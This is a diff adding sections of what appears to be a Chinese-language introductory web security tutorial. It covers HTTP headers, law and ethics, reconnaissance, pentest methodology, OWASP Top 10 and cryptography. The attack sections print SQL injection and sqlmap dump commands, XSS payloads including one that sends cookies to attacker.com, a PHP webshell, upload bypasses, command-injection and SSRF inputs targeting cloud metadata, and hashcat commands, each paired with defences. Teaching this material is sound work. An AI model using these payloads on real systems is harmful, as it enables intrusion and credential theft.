+              <td>403</td>
+              <td>Forbidden</td>
+              <td>无权限（越权测试点）</td>
+            </tr>
+            <tr>
+              <td>404</td>
+              <td>Not Found</td>
+              <td>目录枚举</td>
+            </tr>
+            <tr>
+              <td>500</td>
+              <td>Internal Server Error</td>
+              <td>可能泄露堆栈信息</td>
+            </tr>
+            <tr>
+              <td>502/503</td>
+              <td>网关错误/服务不可用</td>
+              <td>负载均衡问题</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>4.3 Cookie 与会话管理</h3>
+        <pre><code># 安全的 Cookie 属性
+Set-Cookie: session_id=abc123;
+  Domain=example.com;
+  Path=/;
+  Expires=Wed, 27 Aug 2025 00:00:00 GMT;
+  Secure;           # 仅 HTTPS 传输
+  HttpOnly;         # JavaScript 无法访问（防 XSS 窃取）
+  SameSite=Strict;  # 防 CSRF
+  Max-Age=3600</code></pre>
+
+        <h3>4.4 HTTPS 与 TLS</h3>
+        <p>HTTPS = HTTP + TLS/SSL，提供加密传输、身份认证和完整性保护。</p>
+        <ul>
+          <li><strong>TLS 1.2</strong>：目前广泛支持，推荐配置</li>
+          <li>
+            <strong>TLS 1.3</strong>：最新标准，更快更安全（1-RTT 甚至 0-RTT）
+          </li>
+          <li>
+            <strong>SSL 3.0/TLS 1.0/1.1</strong>：已废弃，存在 POODLE、BEAST
+            等漏洞
+          </li>
+        </ul>
+
+        <pre><code># 测试目标 TLS 配置
+nmap --script ssl-enum-ciphers -p 443 example.com
+
+# 使用 openssl 测试连接
+openssl s_client -connect example.com:443 -tls1_2
+openssl s_client -connect example.com:443 -tls1_3
+
+# 检查证书信息
+openssl x509 -in cert.pem -text -noout</code></pre>
+
+        <h3>4.5 同源策略与 CORS</h3>
+        <p>
+          同源策略（Same-Origin
+          Policy）是浏览器最核心的安全机制，协议+域名+端口三者相同才为同源。CORS（跨域资源共享）是放宽同源策略的机制。
+        </p>
+
+        <div class="danger">
+          <strong>危险配置：</strong
+          ><code>Access-Control-Allow-Origin: *</code> 配合
+          <code>Access-Control-Allow-Credentials: true</code>
+          会导致任意网站可携带用户凭证跨域访问，是严重漏洞。
+        </div>
+
+        <h3>4.6 安全响应头</h3>
+        <pre><code># 必配安全头
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Content-Security-Policy: default-src 'self'; script-src 'self'
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: geolocation=(), camera=(), microphone=()</code></pre>
+      </section>
+
+      <!-- ==================== 第五章 ==================== -->
+      <section class="section" id="ch5">
+        <h2><span class="num">05</span> 安全法律法规与道德规范</h2>
+
+        <h3>5.1 中国网络安全法律体系</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>法律</th>
+              <th>实施时间</th>
+              <th>核心要点</th>
+            </tr>
+            <tr>
+              <td>《网络安全法》</td>
+              <td>2017-06-01</td>
+              <td>
+                网络运营者安全义务、关键信息基础设施保护、个人信息保护、网络安全等级保护
+              </td>
+            </tr>
+            <tr>
+              <td>《数据安全法》</td>
+              <td>2021-09-01</td>
+              <td>
+                数据分类分级、重要数据保护、数据出境安全评估、数据交易监管
+              </td>
+            </tr>
+            <tr>
+              <td>《个人信息保护法》</td>
+              <td>2021-11-01</td>
+              <td>
+                告知同意原则、最小必要原则、个人权利（查阅/删除/可携带）、跨境传输
+              </td>
+            </tr>
+            <tr>
+              <td>《密码法》</td>
+              <td>2020-01-01</td>
+              <td>核心密码/普通密码/商用密码分类管理</td>
+            </tr>
+            <tr>
+              <td>《关键信息基础设施安全保护条例》</td>
+              <td>2021-09-01</td>
+              <td>CII 识别、运营者责任、年度检测评估</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>5.2 刑法相关条款</h3>
+        <ul>
+          <li>
+            <strong>第 285 条</strong
+            >：非法侵入计算机信息系统罪、非法获取计算机信息系统数据罪、非法控制计算机信息系统罪
+          </li>
+          <li>
+            <strong>第 286 条</strong>：破坏计算机信息系统罪（包括植入病毒、DDoS
+            等）
+          </li>
+          <li>
+            <strong>第 287 条</strong>：利用计算机实施金融诈骗、盗窃等犯罪
+          </li>
+          <li><strong>第 253 条之一</strong>：侵犯公民个人信息罪</li>
+        </ul>
+
+        <div class="danger">
+          <strong>法律红线：</strong
+          >未经授权对任何系统进行扫描、渗透、漏洞测试均属违法。即使"只是看看"，只要进入了计算机信息系统或获取了数据，就可能触犯刑法第
+          285 条。务必在<strong>书面授权</strong>范围内开展安全测试。
+        </div>
+
+        <h3>5.3 等保 2.0</h3>
+        <p>网络安全等级保护（等保）是中国网络安全的基本制度：</p>
+        <ul>
+          <li><strong>第一级</strong>：自主保护（一般损害）</li>
+          <li><strong>第二级</strong>：指导保护（严重损害）— 多数企业系统</li>
+          <li>
+            <strong>第三级</strong>：监督保护（特别严重损害）—
+            重要系统，需每年测评
+          </li>
+          <li>
+            <strong>第四级</strong>：强制保护（极其严重损害）— 关键信息基础设施
+          </li>
+          <li><strong>第五级</strong>：专控保护 — 国家级核心系统</li>
+        </ul>
+
+        <h3>5.4 白帽道德规范</h3>
+        <ul>
+          <li>获得<strong>书面授权</strong>后再测试，明确测试范围和时间窗口</li>
+          <li>不下载、不泄露、不篡改目标数据，验证漏洞后立即停止</li>
+          <li>不使用影响业务的测试手段（如 DDoS、社工真实员工）</li>
+          <li>
+            漏洞通过<strong>负责任披露</strong>渠道报告，给厂商合理修复时间
+          </li>
+          <li>遵守《网络安全法》和平台漏洞披露规则（如 CNVD、CNNVD）</li>
+          <li>不利用已发现的漏洞谋取私利或进行勒索</li>
+        </ul>
+
+        <h3>5.5 国际法规与框架</h3>
+        <ul>
+          <li>
+            <strong>GDPR</strong
+            >（欧盟通用数据保护条例）：全球最严格的数据保护法规，最高罚款全球营收
+            4%
+          </li>
+          <li>
+            <strong>CCPA</strong>（加州消费者隐私法）：消费者数据知情权和删除权
+          </li>
+          <li><strong>ISO 27001</strong>：信息安全管理体系（ISMS）国际标准</li>
+          <li>
+            <strong>NIST CSF</strong
+            >：美国国家标准与技术研究院网络安全框架（识别/保护/检测/响应/恢复）
+          </li>
+          <li>
+            <strong>MITRE ATT&amp;CK</strong
+            >：对抗战术与技术知识库，已成为行业标准
+          </li>
+        </ul>
+      </section>
+
+      <!-- ==================== 第六章 ==================== -->
+      <section class="section" id="ch6">
+        <h2><span class="num">06</span> 信息收集与侦察技术</h2>
+
+        <h3>6.1 信息收集分类</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>类型</th>
+              <th>方式</th>
+              <th>典型工具</th>
+            </tr>
+            <tr>
+              <td>被动信息收集</td>
+              <td>不直接接触目标，通过公开渠道获取</td>
+              <td>WHOIS、Shodan、Google Hacking、Wayback Machine</td>
+            </tr>
+            <tr>
+              <td>主动信息收集</td>
+              <td>直接与目标交互获取信息</td>
+              <td>Nmap、Masscan、目录扫描、端口扫描</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>6.2 域名与子域名收集</h3>
+        <pre><code># WHOIS 查询
+whois example.com
+# 在线：whois.chinaz.com、whois.iana.org
+
+# 子域名枚举
+# 1. 子域名挖掘工具
+subfinder -d example.com -o subs.txt
+amass enum -d example.com
+sublist3r -d example.com
+
+# 2. 证书透明度日志
+curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value'
+
+# 3. DNS 爆破
+dnsrecon -d example.com -D subdomains.txt -t brt
+gobuster dns -d example.com -w subdomains.txt
+
+# 4. DNS 记录查询
+dig example.com ANY
+dig example.com TXT
+dig example.com MX
+host -t txt example.com</code></pre>
+
+        <h3>6.3 资产搜索引擎</h3>
+        <ul>
+          <li>
+            <strong>Shodan</strong
+            >（shodan.io）：搜索联网设备，支持端口、服务、Banner 过滤
+          </li>
+          <li><strong>Censys</strong>（censys.io）：证书和设备扫描</li>
+          <li>
+            <strong>FOFA</strong>（fofa.info）：国内网络空间测绘，语法丰富
+          </li>
+          <li><strong>Hunter</strong>（hunter.qianxin.com）：奇安信鹰图平台</li>
+          <li><strong>Quake</strong>（quake.360.net）：360 网络空间测绘</li>
+        </ul>
+
+        <pre><code># FOFA 搜索语法示例
+domain="example.com"                    # 搜索指定域名
+ip="192.168.1.0/24"                     # 搜索指定 IP 段
+port="6379"                             # 搜索 Redis 端口
+title="后台登录"                         # 搜索标题
+body="phpinfo()"                        # 搜索页面内容
+app="Apache-Shiro"                      # 搜索 Shiro 框架
+cert="example.com"                      # 搜索 SSL 证书</code></pre>
+
+        <h3>6.4 Google Hacking（Google Dorks）</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>语法</th>
+              <th>用途</th>
+              <th>示例</th>
+            </tr>
+            <tr>
+              <td>site:</td>
+              <td>限定域名</td>
+              <td>site:example.com</td>
+            </tr>
+            <tr>
+              <td>filetype:</td>
+              <td>限定文件类型</td>
+              <td>site:example.com filetype:pdf</td>
+            </tr>
+            <tr>
+              <td>inurl:</td>
+              <td>URL 中包含关键词</td>
+              <td>inurl:admin login</td>
+            </tr>
+            <tr>
+              <td>intitle:</td>
+              <td>标题中包含关键词</td>
+              <td>intitle:"index of" /etc</td>
+            </tr>
+            <tr>
+              <td>intext:</td>
+              <td>正文中包含关键词</td>
+              <td>intext:"sql syntax near"</td>
+            </tr>
+            <tr>
+              <td>cache:</td>
+              <td>查看 Google 缓存</td>
+              <td>cache:example.com</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>6.5 端口扫描（Nmap）</h3>
+        <pre><code># 基础扫描
+nmap 192.168.1.1                    # 默认 TCP 扫描 Top 1000 端口
+nmap -sP 192.168.1.0/24            # Ping 扫描（主机发现）
+nmap -p- 192.168.1.1               # 全端口扫描（1-65535）
+nmap -p 22,80,443,8080 192.168.1.1 # 指定端口
+
+# 扫描类型
+nmap -sS 192.168.1.1    # SYN 半开扫描（隐蔽，需 root）
+nmap -sT 192.168.1.1    # TCP 全连接扫描
+nmap -sU 192.168.1.1    # UDP 扫描
+nmap -sV 192.168.1.1    # 服务版本探测
+nmap -O 192.168.1.1     # 操作系统识别
+
+# 综合扫描（常用）
+nmap -sV -sC -O -p- -T4 192.168.1.1 -oA result
+
+# NSE 脚本
+nmap --script vuln 192.168.1.1           # 漏洞扫描
+nmap --script http-enum 192.168.1.1      # Web 目录枚举
+nmap --script ssl-heartbleed 192.168.1.1 # Heartbleed 检测
+
+# 速度选项
+# -T0 偏执 / -T1 鬼祟 / -T2 礼貌 / -T3 正常 / -T4 激进 / -T5 疯狂</code></pre>
+
+        <h3>6.6 目录与文件扫描</h3>
+        <pre><code># Gobuster
+gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
+gobuster dir -u http://example.com -w directory-list-2.3-medium.txt -t 50
+
+# Dirsearch
+python3 dirsearch.py -u http://example.com -e php,asp,aspx,jsp,html,zip
+
+# FFUF（模糊测试）
+ffuf -u http://example.com/FUZZ -w wordlist.txt
+ffuf -u http://example.com/api/FUZZ -w api-endpoints.txt -mc 200,301,403
+
+# 备份文件、敏感文件常见名称
+www.zip、backup.tar.gz、web.config.bak、.git/HEAD、.env、
+phpinfo.php、test.php、.DS_Store、WEB-INF/web.xml</code></pre>
+
+        <h3>6.7 其他侦察手段</h3>
+        <pre><code># WAF 识别
+wafw00f http://example.com
+nmap --script http-waf-detect http://example.com
+
+# CMS 识别
+whatweb http://example.com
+cmseek -u http://example.com
+
+# 邮件收集
+theHarvester -d example.com -b google,bing
+hunter.io  # 在线邮箱搜索
+
+# GitHub 信息泄露
+# 搜索：password、secret、api_key、AKIA（AWS Key）
+# 工具：gitrob、truffleHog、gitleaks
+
+# Wayback Machine
+curl -s "https://web.archive.org/cdx/search/cdx?url=example.com/*&output=json&fl=original&collapse=urlkey"</code></pre>
+      </section>
+
+      <!-- ==================== 第七章 ==================== -->
+      <section class="section" id="ch7">
+        <h2><span class="num">07</span> 漏洞扫描与渗透测试入门</h2>
+
+        <h3>7.1 漏洞分类与评分</h3>
+
+        <h4>CVE 与 CVSS</h4>
+        <p>
+          <strong>CVE</strong>（Common Vulnerabilities and
+          Exposures）是公开漏洞的唯一编号，格式为
+          CVE-年份-序号。<strong>CVSS</strong>（通用漏洞评分系统）给出 0.0-10.0
+          的严重程度评分：
+        </p>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>等级</th>
+              <th>CVSS 分数</th>
+              <th>示例</th>
+            </tr>
+            <tr>
+              <td>严重 (Critical)</td>
+              <td>9.0 - 10.0</td>
+              <td>Log4Shell (10.0)、永恒之蓝 (9.3)</td>
+            </tr>
+            <tr>
+              <td>高危 (High)</td>
+              <td>7.0 - 8.9</td>
+              <td>SQL 注入、远程代码执行</td>
+            </tr>
+            <tr>
+              <td>中危 (Medium)</td>
+              <td>4.0 - 6.9</td>
+              <td>XSS、CSRF、信息泄露</td>
+            </tr>
+            <tr>
+              <td>低危 (Low)</td>
+              <td>0.1 - 3.9</td>
+              <td>版本信息泄露、点击劫持</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>7.2 漏洞扫描工具</h3>
+        <pre><code># Nessus — 业界最知名的商业漏洞扫描器
+# 启动 Nessus 服务后访问 https://localhost:8834
+
+# OpenVAS/GVM — 开源漏洞扫描器
+sudo gvm-setup
+sudo gvm-start
+
+# Nikto — Web 服务器漏洞扫描
+nikto -h http://example.com
+nikto -h http://example.com -p 80,443,8080
+
+# Nuclei — 基于模板的快速漏洞扫描
+nuclei -u http://example.com
+nuclei -l urls.txt -t cves/ -t exposures/
+nuclei -u http://example.com -tags cve,rce,sqli
+
+# WPscan — WordPress 专用扫描
+wpscan --url http://example.com --enumerate u,p,t</code></pre>
+
+        <h3>7.3 渗透测试标准流程</h3>
+        <p>
+          渗透测试是在授权条件下模拟攻击者评估系统安全性的过程。标准流程如下：
+        </p>
+
+        <ol>
+          <li>
+            <strong>前期交互（Pre-engagement）</strong
+            >：确定范围、目标、时间窗口、授权书、测试类型
+          </li>
+          <li>
+            <strong>情报收集（Reconnaissance）</strong>：被动收集 +
+            主动扫描，梳理攻击面
+          </li>
+          <li>
+            <strong>威胁建模（Threat Modeling）</strong
+            >：分析资产价值、可能的攻击路径
+          </li>
+          <li>
+            <strong>漏洞分析（Vulnerability Analysis）</strong>：自动化扫描 +
+            手动验证
+          </li>
+          <li>
+            <strong>渗透利用（Exploitation）</strong>：验证漏洞、获取访问权限
+          </li>
+          <li>
+            <strong>后渗透（Post-exploitation）</strong
+            >：提权、横向移动、权限维持、数据获取
+          </li>
+          <li>
+            <strong>报告（Reporting）</strong
+            >：漏洞详情、风险等级、修复建议、复测验证
+          </li>
+        </ol>
+
+        <h3>7.4 渗透测试类型</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>类型</th>
+              <th>测试者已知信息</th>
+              <th>模拟场景</th>
+              <th>优点</th>
+              <th>缺点</th>
+            </tr>
+            <tr>
+              <td>黑盒测试</td>
+              <td>无内部信息</td>
+              <td>外部攻击者</td>
+              <td>真实模拟外部攻击</td>
+              <td>覆盖面有限、耗时</td>
+            </tr>
+            <tr>
+              <td>白盒测试</td>
+              <td>完整内部信息（源码、架构、凭证）</td>
+              <td>内部人员/代码审计</td>
+              <td>覆盖率高、发现深层问题</td>
+              <td>不模拟真实攻击</td>
+            </tr>
+            <tr>
+              <td>灰盒测试</td>
+              <td>部分信息（低权限账号）</td>
+              <td>普通用户提权</td>
+              <td>平衡真实性和深度</td>
+              <td>—</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>7.5 漏洞验证与 PoC</h3>
+        <p>扫描器发现的漏洞必须手动验证，排除误报。验证时遵循最小影响原则：</p>
+        <pre><code># SQL 注入验证（布尔盲注）
+http://example.com/news?id=1 AND 1=1  → 正常页面
+http://example.com/news?id=1 AND 1=2  → 异常/空页面
+
+# XSS 验证（使用唯一标识，不弹 alert）
+http://example.com/search?q=&lt;svg onload=console.log(document.domain)&gt;
+
+# 命令注入验证（DNS 外带，不执行危险命令）
+http://example.com/ping?ip=127.0.0.1;whoami
+
+# SSRF 验证（访问内网元数据服务）
+http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/</code></pre>
+
+        <div class="warn">
+          <strong>注意：</strong>验证漏洞时不要使用 <code>rm -rf</code>、<code
+            >DROP TABLE</code
+          >
+          等破坏性操作。数据验证完成后立即停止，不下载超出范围的数据。
+        </div>
+
+        <h3>7.6 渗透测试报告结构</h3>
+        <ol>
+          <li>
+            <strong>执行摘要</strong>：面向管理层，概述整体安全状况和核心风险
+          </li>
+          <li><strong>测试范围与方法</strong>：目标、时间、测试类型、工具</li>
+          <li><strong>漏洞统计</strong>：按严重等级分类的漏洞数量和趋势</li>
+          <li>
+            <strong>漏洞详情</strong
+            >：每个漏洞包含标题、等级、描述、复现步骤、PoC、影响范围、修复建议
+          </li>
+          <li><strong>复测结果</strong>：修复后重新测试的结果</li>
+          <li><strong>附录</strong>：工具列表、参考资料、术语表</li>
+        </ol>
+      </section>
+
+      <!-- ==================== 第八章 ==================== -->
+      <section class="section" id="ch8">
+        <h2><span class="num">08</span> Web 安全与 OWASP Top 10</h2>
+
+        <h3>8.1 OWASP Top 10（2021）</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>编号</th>
+              <th>漏洞类型</th>
+              <th>说明</th>
+            </tr>
+            <tr>
+              <td>A01</td>
+              <td>访问控制失效</td>
+              <td>越权访问、未授权功能暴露</td>
+            </tr>
+            <tr>
+              <td>A02</td>
+              <td>加密失败</td>
+              <td>敏感数据明文传输、弱加密</td>
+            </tr>
+            <tr>
+              <td>A03</td>
+              <td>注入</td>
+              <td>SQL/NoSQL/命令/LDAP 注入</td>
+            </tr>
+            <tr>
+              <td>A04</td>
+              <td>不安全设计</td>
+              <td>业务逻辑缺陷、缺乏安全设计</td>
+            </tr>
+            <tr>
+              <td>A05</td>
+              <td>安全配置错误</td>
+              <td>默认配置、错误信息泄露、目录遍历</td>
+            </tr>
+            <tr>
+              <td>A06</td>
+              <td>脆弱易受攻击的组件</td>
+              <td>第三方库漏洞、过时依赖</td>
+            </tr>
+            <tr>
+              <td>A07</td>
+              <td>认证与身份识别失败</td>
+              <td>弱密码、会话固定、暴力破解</td>
+            </tr>
+            <tr>
+              <td>A08</td>
+              <td>软件与数据完整性失败</td>
+              <td>供应链攻击、CI/CD 未保护</td>
+            </tr>
+            <tr>
+              <td>A09</td>
+              <td>安全日志与监控失败</td>
+              <td>未记录安全事件、告警缺失</td>
+            </tr>
+            <tr>
+              <td>A10</td>
+              <td>服务端请求伪造（SSRF）</td>
+              <td>服务端发起恶意请求</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>8.2 SQL 注入</h3>
+        <p>
+          SQL 注入是由于未对用户输入进行过滤，直接拼接到 SQL 语句中导致的漏洞。
+        </p>
+
+        <h4>注入类型</h4>
+        <ul>
+          <li>
+            <strong>联合查询注入</strong>：使用
+            <code>UNION SELECT</code> 获取其他表数据
+          </li>
+          <li><strong>布尔盲注</strong>：通过页面真假状态逐字符猜解</li>
+          <li>
+            <strong>时间盲注</strong>：通过
+            <code>SLEEP()</code> 延迟判断，无回显时使用
+          </li>
+          <li><strong>报错注入</strong>：利用数据库报错信息获取数据</li>
+          <li><strong>堆叠查询</strong>：用分号执行多条 SQL 语句</li>
+        </ul>
+
+        <pre><code># 经典登录绕过
+' OR '1'='1' --
+admin' --
+' OR 1=1#
+
+# 联合查询
+1 UNION SELECT 1,version(),database(),user(),5--
+1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()--
+
+# 布尔盲注
+1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+
+# 时间盲注
+1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
+
+# sqlmap 自动化
+sqlmap -u "http://example.com/news?id=1" --dbs
+sqlmap -u "http://example.com/news?id=1" -D dbname --tables
+sqlmap -u "http://example.com/news?id=1" -D dbname -T users --columns
+sqlmap -u "http://example.com/news?id=1" -D dbname -T users -C username,password --dump
+sqlmap -r request.txt --batch --level 3 --risk 2</code></pre>
+
+        <h4>防御方案</h4>
+        <pre><code>// 1. 参数化查询（Prepared Statement）— 最根本的防御
+String sql = "SELECT * FROM users WHERE username = ?";
+PreparedStatement pstmt = conn.prepareStatement(sql);
+pstmt.setString(1, username);
+
+# 2. Python 参数化
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+
+# 3. 使用 ORM（Django ORM / SQLAlchemy / MyBatis）
+User.objects.filter(username=username)
+
+# 4. 最小权限：数据库账号只给 SELECT/INSERT，不给 DROP/ALTER
+# 5. 输入校验：白名单、类型检查、长度限制
+# 6. WAF：ModSecurity 作为辅助防护</code></pre>
+
+        <h3>8.3 XSS（跨站脚本攻击）</h3>
+        <p>
+          XSS 是由于未对用户输入进行 HTML
+          编码，导致恶意脚本在受害者浏览器中执行。
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>类型</th>
+              <th>存储位置</th>
+              <th>触发方式</th>
+              <th>危害</th>
+            </tr>
+            <tr>
+              <td>反射型 XSS</td>
+              <td>URL 参数</td>
+              <td>诱导点击链接</td>
+              <td>窃取 Cookie、钓鱼</td>
+            </tr>
+            <tr>
+              <td>存储型 XSS</td>
+              <td>数据库</td>
+              <td>访问页面自动触发</td>
+              <td>危害最大，影响所有用户</td>
+            </tr>
+            <tr>
+              <td>DOM 型 XSS</td>
+              <td>前端 DOM</td>
+              <td>前端 JS 处理 URL 参数</td>
+              <td>服务端无感知</td>
+            </tr>
+          </table>
+        </div>
+
+        <pre><code># 常见 Payload
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;iframe src="javascript:alert(1)"&gt;
+
+# 窃取 Cookie（外部服务器接收）
+&lt;script&gt;new Image().src="http://attacker.com/steal?c="+document.cookie&lt;/script&gt;
+
+# 防御
+# 1. 输出编码：HTML 实体编码（&lt; → &amp;lt;）
+# 2. CSP 头部：Content-Security-Policy: script-src 'self'
+# 3. HttpOnly Cookie：JS 无法读取
+# 4. 框架自带转义：React {}、Vue {{ }} 默认转义</code></pre>
+
+        <h3>8.4 CSRF（跨站请求伪造）</h3>
+        <p>
+          攻击者诱导已登录用户访问恶意页面，利用用户身份发起非本人意愿的请求。
+        </p>
+        <pre><code># 攻击原理
+1. 用户登录 bank.com，Cookie 保存在浏览器
+2. 用户访问 attacker.com
+3. attacker.com 中隐藏表单自动提交到 bank.com/transfer
+4. 浏览器自动带上 bank.com 的 Cookie，转账成功
+
+# 防御
+# 1. CSRF Token：每次请求携带不可预测的 Token
+# 2. SameSite Cookie：Set-Cookie: SameSite=Strict/Lax
+# 3. 验证 Referer/Origin
+# 4. 敏感操作二次验证（密码/验证码）</code></pre>
+
+        <h3>8.5 SSRF（服务端请求伪造）</h3>
+        <p>
+          服务端根据用户提供的 URL 发起请求，攻击者可利用此功能访问内网资源。
+        </p>
+        <pre><code># 常见利用点
+http://example.com/fetch?url=http://127.0.0.1:6379
+http://example.com/fetch?url=file:///etc/passwd
+http://example.com/fetch?url=dict://127.0.0.1:6379/INFO
+http://example.com/fetch?url=gopher://127.0.0.1:6379/_SET...
+
+# 云环境元数据
+# AWS
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# 阿里云
+http://100.100.100.200/latest/meta-data/
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+
+# 防御
+# 1. URL 白名单，禁止内网 IP
+# 2. 禁止 file://、gopher://、dict:// 等协议
+# 3. DNS 重绑定防护
+# 4. 网络隔离：Web 服务器不能直接访问内网</code></pre>
+
+        <h3>8.6 文件上传漏洞</h3>
+        <pre><code># 攻击方式
+# 1. 直接上传 WebShell
+shell.php 内容：&lt;?php @eval($_POST['cmd']); ?&gt;
+
+# 2. 绕过前端验证
+# Burp 抓包修改文件名 / Content-Type
+
+# 3. 绕过黑名单
+shell.phtml、shell.php3、shell.pHp（大小写）
+shell.php.jpg（双扩展）
+shell.php%00.jpg（截断，PHP<5.3.4）
+.htaccess 配置解析
+
+# 4. 图片马
+copy normal.jpg/b + shell.php/a shell.jpg
+
+# 防御
+# 1. 白名单校验扩展名
+# 2. 文件内容检测（文件头、二次渲染）
+# 3. 上传目录禁止执行权限
+# 4. 随机重命名，存储到独立域名
+# 5. 使用 OSS/CDN 隔离</code></pre>
+
+        <h3>8.7 其他常见 Web 漏洞</h3>
+        <ul>
+          <li>
+            <strong>命令注入</strong>：<code
+              >; | &amp;&amp; || $(command) `command`</code
+            >
+            拼接系统命令，防御用白名单和参数化 API
+          </li>
+          <li>
+            <strong>XXE（XML 外部实体）</strong>：利用 XML
+            解析器读取本地文件，防御禁用外部实体
+          </li>
+          <li>
+            <strong>反序列化</strong>：PHP/Java/Python 反序列化恶意对象导致
+            RCE，防御不反序列化不可信数据
+          </li>
+          <li>
+            <strong>逻辑漏洞</strong
+            >：支付篡改、密码找回绕过、越权访问，防御加强服务端校验
+          </li>
+          <li>
+            <strong>目录遍历</strong
+            >：<code>../../etc/passwd</code>，防御路径规范化和白名单
+          </li>
+          <li>
+            <strong>开放重定向</strong
+            >：<code>?url=//evil.com</code>，防御白名单校验跳转地址
+          </li>
+        </ul>
+      </section>
+
+      <!-- ==================== 第九章 ==================== -->
+      <section class="section" id="ch9">
+        <h2><span class="num">09</span> 密码学与加密技术</h2>
+
+        <h3>9.1 密码学基础</h3>
+        <div class="table-wrap">
+          <table>
+            <tr>
+              <th>类型</th>
+              <th>特点</th>
+              <th>代表算法</th>
+              <th>用途</th>
+            </tr>
+            <tr>
+              <td>对称加密</td>
+              <td>加解密用同一密钥，速度快</td>
+              <td>AES、DES、3DES、ChaCha20</td>
+              <td>大量数据加密</td>
+            </tr>
+            <tr>
+              <td>非对称加密</td>
+              <td>公钥加密/私钥解密，速度慢</td>
+              <td>RSA、ECC、DSA</td>
+              <td>密钥交换、数字签名</td>
+            </tr>
+            <tr>
+              <td>哈希函数</td>
+              <td>单向不可逆，定长输出</td>
+              <td>MD5、SHA-1、SHA-256、SHA-3</td>
+              <td>完整性校验、密码存储</td>
+            </tr>
+            <tr>
+              <td>消息认证码</td>
+              <td>哈希+密钥</td>
+              <td>HMAC-SHA256</td>
+              <td>接口签名、防篡改</td>
+            </tr>
+          </table>
+        </div>
+
+        <h3>9.2 对称加密（AES）</h3>
+        <pre><code># AES 加密模式
+# ECB：电子密码本，相同明文产生相同密文（不安全）
+# CBC：密码块链接，需要 IV，最常用
+# GCM：Galois/计数器模式，同时加密+认证（推荐）
+# CTR：计数器模式，可并行
+
+# Python AES-GCM 示例
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import os
+
+key = AESGCM.generate_key(bit_length=256)
+aesgcm = AESGCM(key)
+nonce = os.urandom(12)
+ciphertext = aesgcm.encrypt(nonce, b"secret data", None)
+plaintext = aesgcm.decrypt(nonce, ciphertext, None)
+
+# OpenSSL 命令行
+echo -n "secret" | openssl enc -aes-256-cbc -pbkdf2 -a
+openssl enc -aes-256-cbc -pbkdf2 -d -a -in encrypted.txt</code></pre>
+
+        <h3>9.3 非对称加密（RSA / ECC）</h3>
+        <pre><code># RSA 密钥生成
+openssl genrsa -out private.pem 2048
+openssl rsa -in private.pem -pubout -out public.pem
+
+# RSA 加解密
+openssl rsautl -encrypt -inkey public.pem -pubin -in data.txt -out enc.bin
+openssl rsautl -decrypt -inkey private.pem -in enc.bin -out dec.txt
+
+# RSA 签名与验证
+openssl dgst -sha256 -sign private.pem -out signature.bin data.txt
+openssl dgst -sha256 -verify public.pem -signature signature.bin data.txt
+
+# ECC（更短的密钥、更高的安全性）
+openssl ecparam -genkey -name prime256v1 -out ecc_private.pem
+openssl ec -in ecc_private.pem -pubout -out ecc_public.pem</code></pre>
+
+        <h3>9.4 哈希与密码存储</h3>
+        <pre><code># 哈希算法
+# MD5     — 128 位，已不安全（碰撞攻击）
+# SHA-1   — 160 位，已不安全（SHAttered）
+# SHA-256 — 256 位，当前推荐
+# SHA-3   — 最新标准，不同结构
+# BLAKE2  — 高性能替代
+
+# 计算哈希
+echo -n "password" | sha256sum
+echo -n "password" | md5sum
+hashcat -m 0 hash.txt wordlist.txt    # MD5 破解
+hashcat -m 1000 hash.txt wordlist.txt # NTLM 破解
+hashcat -m 2500 capture.hccapx wordlist.txt  # WPA2
+
+# 密码安全存储（重要！）
+# ❌ 错误：直接存 MD5/SHA256（可彩虹表破解）
+# ✅ 正确：使用专门密码哈希算法
+
+# bcrypt（自带盐，可调成本因子）
+import bcrypt
+hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
+bcrypt.checkpw(password.encode(), hashed)
+
+# Argon2（密码哈希竞赛冠军，当前最推荐）
+from argon2 import PasswordHasher
+ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
+hash = ph.hash("password")
+ph.verify(hash, "password")
+
+# PBKDF2（系统内置，无需额外库）
+import hashlib
+dk = hashlib.pbkdf2_hmac('sha256', password, salt, 100000)</code></pre>
+
+        <h3>9.5 数字证书与 PKI</h3>
+        <p>
+          数字证书由 CA（证书颁发机构）签发，用于绑定公钥与身份，是 HTTPS
+          的信任基础。
+        </p>
+        <pre><code># 证书链结构
+根 CA（自签名）→ 中间 CA → 终端证书（你的域名）
+
+# Let's Encrypt 免费证书申请
+certbot certonly --standalone -d example.com -d www.example.com
+certbot renew --dry-run
+
+# 证书格式转换
+# PEM → DER
+openssl x509 -in cert.pem -outform der -out cert.der
+# PFX/P12 → PEM
+openssl pkcs12 -in cert.pfx -nocerts -out key.pem
